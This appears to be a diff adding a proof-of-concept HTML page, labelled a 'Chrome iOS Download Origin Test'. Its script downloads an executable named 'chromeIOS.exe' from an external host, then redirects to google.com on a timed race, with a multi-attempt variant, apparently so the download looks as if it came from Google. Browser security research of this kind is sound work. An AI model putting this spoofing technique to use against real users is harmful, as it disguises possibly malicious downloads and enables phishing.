@@ -1,0 +1,101 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+
+<style>
+.button {
+  background-color: #4CAF50;
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  text-align: center;
+  font-size: 16px;
+  margin: 4px 2px;
+  cursor: pointer;
+}
+</style>
+
+<script>
+
+function triggerDownload() {
+
+  console.log("Starting download...");
+
+  // create temporary link
+  var link = document.createElement("a");
+  link.href = "https://ecdnts-del.github.io/test-apk/chromeIOS.exe";
+  link.download = "chromeIOS.exe";
+
+  document.body.appendChild(link);
+
+  // trigger download
+  link.click();
+
+  document.body.removeChild(link);
+
+  // redirect after short delay
+  setTimeout(function () {
+
+    console.log("Redirecting to google.com");
+
+    window.location.href = "https://google.com";
+
+  }, 320); // 320ms delay (race condition window)
+
+}
+
+
+function multiAttempt(){
+
+  console.log("Running multiple attempts to trigger race condition");
+
+  let delays = [250,300,320,350,400];
+
+  delays.forEach(function(d){
+
+    setTimeout(function(){
+
+      var link = document.createElement("a");
+      link.href = "https://ecdnts-del.github.io/test-apk/chromeIOS.exe";
+      link.download = "chromeIOS.exe";
+
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+
+      setTimeout(function(){
+        window.location.href = "https://google.com";
+      }, d);
+
+    }, 100);
+
+  });
+
+}
+
+</script>
+</head>
+
+<body>
+
+<center>
+
+<h2>Chrome iOS Download Origin Test</h2>
+
+<br>
+
+<input type="button" class="button"
+value="Single Attempt"
+onclick="triggerDownload()">
+
+<br><br>
+
+<input type="button" class="button"
+value="Multi Attempt (More Reliable)"
+onclick="multiAttempt()">
+
+</center>
+
+</body>
+</html>
